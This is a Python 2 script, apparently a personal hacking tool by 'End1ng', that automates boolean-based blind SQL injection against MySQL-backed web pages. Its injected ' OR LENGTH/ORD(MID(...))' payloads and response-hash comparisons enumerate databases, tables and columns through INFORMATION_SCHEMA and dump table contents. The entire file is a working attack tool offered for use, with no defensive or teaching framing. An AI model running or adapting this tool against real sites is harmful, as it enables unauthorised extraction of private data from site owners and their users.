#-*- coding:utf-8 -*-
# author:End1ng

import requests
# import threading
import logging
import argparse
import sys
from time import sleep
from binascii import hexlify
import hashlib

def Argparse():

    parser = argparse.ArgumentParser(usage="%(prog)s [options]",add_help=False,

    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=(u'''
        作者：End1ng blog:end1ng.wordpress.com
        --------------------------------
        Boolean-based blind SQL injection'''))
    optional = parser.add_argument_group('optional arguments')
    optional.add_argument('-h', '--help', action="store_true", help='help of the %(prog)s program')
    optional.add_argument('--version', action='version', version='%(prog)s 1.1')

    args = parser.add_argument_group('Necessary parameter')

    args.add_argument('-u','--url',metavar=u'url',help=u'*目标url 多个用空格分隔')
    args.add_argument('-p','--post', nargs='*',metavar=u'data',help=u'post数据 eg:user=username pass=password')

    args.add_argument('-D',metavar=u'url',help=u'数据库名')
    args.add_argument('--dbs',action="store_true", help=u'读取数据库')

    args.add_argument('-T',metavar=u'url',help=u'表名')
    args.add_argument('--tables',action="store_true", help=u'读取表')

    args.add_argument('-C',nargs='*',metavar=u'url',help=u'列名')
    args.add_argument('--columns',action="store_true", help=u'读取列')

    args.add_argument('--dump',action="store_true", help=u'读取字段')

    other = parser.add_argument_group('other arguments')
    other.add_argument('--level',metavar=u'level',help=u'程序运行级别:CRITICAL,ERROR,WARNING,INFO,DEBUG,NOTSET')
    other.add_argument('--delay',metavar=u'num',default=0,help=u'访问延迟')
    other.add_argument('--cookie',metavar=u'str',help=u'cookie')

    args=parser.parse_args()
    args = vars(args)

    if len(sys.argv) == 1 or args['help']:
        parser.print_help()
        sys.exit()
    if not args['url']:
        print u"请输入url"
        sys.exit()
    return args

class classlog(object):
    """log class"""
    def __init__(self,logfilename="log.txt",level="INFO"):
        level = level if level in ['CRITICAL','ERROR','WARNING','INFO','DEBUG','NOTSET'] else 'INFO'
        self.logger = logging.getLogger("classlog")
        self.logger.setLevel(logging.DEBUG)
        Fileformatter = logging.Formatter("%(asctime)s - %(filename)s - %(levelname)-8s:%(message)s",
        datefmt='%Y-%m-%d %I:%M:%S %p')
        Streamformatter = logging.Formatter("%(asctime)s %(filename)s %(levelname)s:%(message)s",
        datefmt='%Y-%m-%d %I:%M:%S')# ,filename='example.log')

        Filelog = logging.FileHandler(logfilename)
        Filelog.setFormatter(Fileformatter)
        Filelog.setLevel(logging.DEBUG)

        Streamlog = logging.StreamHandler()
        Streamlog.setFormatter(Streamformatter)
        Streamlog.setLevel(level)

        self.logger.addHandler(Filelog)
        self.logger.addHandler(Streamlog)

    def debug(self,msg):
        self.logger.debug(msg)

    def info(self,msg):
        self.logger.info(msg)

    def warn(self,msg):
        self.logger.warn(msg)

    def error(self,msg):
        self.logger.error(msg)

    def critical(self,msg):
        self.logger.critical(msg)

class MyBoolSqli():
    """docstring for ClassName"""
    def __init__(self, target_url, data=None, delay=0):

        self.target_url = target_url
        self.data = data
        self.delay = delay
        self.hashvalue = self.run_url('')

        self.payload_len = " OR LENGTH(({value})) {opt} {asc_num} LIMIT 1-- -"
        self.payload_asc = " OR ORD(MID(({value}),{asc_pos},1)) {opt} {asc_num} LIMIT 1-- -"

        self.payload_databases = "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA LIMIT {pos}, 1"
        self.payload_tables = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={database} LIMIT {pos}, 1"
        self.payload_columns = "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={database} AND TABLE_NAME={table_name} LIMIT {pos}, 1"
        self.payload_data = "SELECT CONCAT({columns}) FROM {table_name} LIMIT {pos}, 1"

        self.payload_num_databases = " OR (SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA) {opt} {asc_num} LIMIT 1 -- -"
        self.payload_num_tables = " OR (SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA={database}) {opt} {asc_num} LIMIT 1 -- -"
        self.payload_num_columns = " OR (SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA={database} AND TABLE_NAME={table_name}) {opt} {asc_num} LIMIT 1 -- -"
        self.payload_num_data = " OR (SELECT COUNT(CONCAT({columns})) FROM {table_name}) {opt} {asc_num} LIMIT 1 -- -"

    def run_url(self, payload):
        sleep(self.delay)
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0'}
        try:
            if self.data:
                data = {}
                for x in self.data:
                    x = x.split("=")
                    if x[0].startswith("*"):
                        data[x[0][1:]] = x[1] + payload
                    else:
                        data[x[0]] = x[1]
                r = requests.post(self.target_url, headers=headers, data=data)
            else:
                r = requests.get(self.target_url + payload, headers=headers)
            return self.getmd5(r.content)

        except:
            LOG.info(u"连接失败")
            sys.exit()

    def get_num(self, value):
        low, high = 1, 20
        while True:
            if low > high:
                high += low
            if high == 1:
                LOG.info(u"数据为空")
                sys.exit()
            mid = int(round((low + high) / 2.0))
            payload = value.format(opt="{opt}", asc_num=mid)
            if self.run_url(payload.format(opt=">")) != self.hashvalue:
                low = mid + 1
            elif self.run_url(payload.format(opt="<")) != self.hashvalue:
                high = mid - 1
            else:
                return mid

    def get_len(self, value, length):
        low, high = 1, 20
        while True:
            if low > high:
                high += low
            mid = int(round((low + high) / 2.0))
            payload = value.format(opt="{opt}", asc_num=mid)
            if self.run_url(payload.format(opt=">")) != self.hashvalue:
                low = mid + 1
            elif self.run_url(payload.format(opt="<")) != self.hashvalue:
                high = mid - 1
            else:
                return mid

    def get_asc(self, value, length):
        for asc_pos in range(1, length + 1):
            low, high = 1, 127
            while True:
                if high == 0:
                    low = 0
                if low > high:
                    high += low
                mid = int(round((low + high) / 2.0))
                payload = value.format(opt="{opt}", asc_num=mid, asc_pos=asc_pos)
                if self.run_url(payload.format(opt=">")) != self.hashvalue:
                    low = mid + 1
                elif self.run_url(payload.format(opt="<")) != self.hashvalue:
                    high = mid - 1
                else:
                    if mid == 44:
                        print "\n| ",
                    elif mid < 127:
                        sys.stdout.write(chr(mid))
                    else:
                        print mid
                        if mid >= 14909569:
                            sys.stdout.write(str(hex(mid))[2:].decode("hex").decode("utf-8"))
                        elif mid >= 41633:
                            sys.stdout.write(str(hex(mid))[2:].decode("hex").decode("gbk"))
                        else:
                            sys.stdout.write(str(hex(mid))[2:].decode("hex").decode("unicode"))
                    break

    def run_get_database(self):
        payload = self.payload_num_databases
        length = self.get_num(payload)
        LOG.info(u"数据数量:" + str(length))

        for i in range(length):
            value = self.payload_databases.format(pos=i)
            payload = self.payload_len.format(value=value, opt="{opt}", asc_num="{asc_num}")
            length = self.get_len(payload, i)

            payload = self.payload_asc.format(value=value, opt="{opt}", asc_num="{asc_num}", asc_pos="{asc_pos}")
            print "+" + "-" * 30 + "+ %d\n| " % (i + 1),
            self.get_asc(payload, length)
            print
        print "+" + "-" * 30 + "+"


    def run_get_tables(self, database):
        payload = self.payload_num_tables.format(database=self.gethexstr(database), opt="{opt}", asc_num="{asc_num}")
        length = self.get_num(payload)
        LOG.info(u"数据数量:" + str(length))

        for i in range(length):
            value = self.payload_tables.format(pos=i, database=self.gethexstr(database))
            payload = self.payload_len.format(value=value, opt="{opt}", asc_num="{asc_num}")
            length = self.get_len(payload, i)

            payload = self.payload_asc.format(value=value, opt="{opt}", asc_num="{asc_num}", asc_pos="{asc_pos}")
            print "+" + "-" * 30 + "+ %d\n| " % (i + 1),
            self.get_asc(payload, length)
            print
        print "+" + "-" * 30 + "+"

    def run_get_columns(self, database, table_name):
        payload = self.payload_num_columns.format(database=self.gethexstr(database), table_name=self.gethexstr(table_name), opt="{opt}", asc_num="{asc_num}")
        length = self.get_num(payload)
        LOG.info(u"数据数量:" + str(length))

        for i in range(length):
            value = self.payload_columns.format(pos=i, database=self.gethexstr(database), table_name=self.gethexstr(table_name))
            payload = self.payload_len.format(value=value, opt="{opt}", asc_num="{asc_num}")
            length = self.get_len(payload, i)

            payload = self.payload_asc.format(value=value, opt="{opt}", asc_num="{asc_num}", asc_pos="{asc_pos}")
            print "+" + "-" * 30 + "+ %d\n| " % (i + 1),
            self.get_asc(payload, length)
            print
        print "+" + "-" * 30 + "+"

    def run_get_data(self, database, table_name, columns):
        payload = self.payload_num_data.format(table_name=table_name, columns=columns, opt="{opt}", asc_num="{asc_num}")
        length = self.get_num(payload)
        LOG.info(u"数据数量:" + str(length))

        for i in range(length):
            value = self.payload_data.format(pos=i, columns=columns, table_name=database + "." + table_name)
            payload = self.payload_len.format(value=value, opt="{opt}", asc_num="{asc_num}")
            length = self.get_len(payload, i)

            payload = self.payload_asc.format(value=value, opt="{opt}", asc_num="{asc_num}", asc_pos="{asc_pos}")
            print "+" + "-" * 30 + "+ %d\n| " % (i + 1),
            self.get_asc(payload, length)
            print
        print "+" + "-" * 30 + "+"

    def getmd5(self, src):
        m = hashlib.md5()
        m.update(src)
        return m.hexdigest()

    def gethexstr(self, string):
        return "0x" + hexlify(string)


ARGV = Argparse()
LOG = classlog("log.txt", ARGV["level"])

if ARGV["post"]:
    temp = True
    for i in ARGV["post"]:
        if i.startswith("*"):
            temp = False
    if temp:
        LOG.error(u"请指定注入点")
        sys.exit()


if ARGV["dbs"]:
    MyBoolSqli(ARGV["url"], ARGV["post"], ARGV["delay"]).run_get_database()
elif ARGV["tables"] and ARGV["D"]:
    MyBoolSqli(ARGV["url"], ARGV["post"], ARGV["delay"]).run_get_tables(ARGV["D"])
elif ARGV["columns"] and ARGV["D"] and ARGV["T"]:
    MyBoolSqli(ARGV["url"], ARGV["post"], ARGV["delay"]).run_get_columns(ARGV["D"], ARGV["T"])
elif ARGV["dump"] and ARGV["D"] and ARGV["T"] and ARGV["C"]:
    value = ""
    for x in ARGV["C"]:
        value += x + ",0x2c,"
    MyBoolSqli(ARGV["url"], ARGV["post"], ARGV["delay"]).run_get_data(ARGV["D"], ARGV["T"], value[:-6])
else:
    LOG.error(u"参数错误")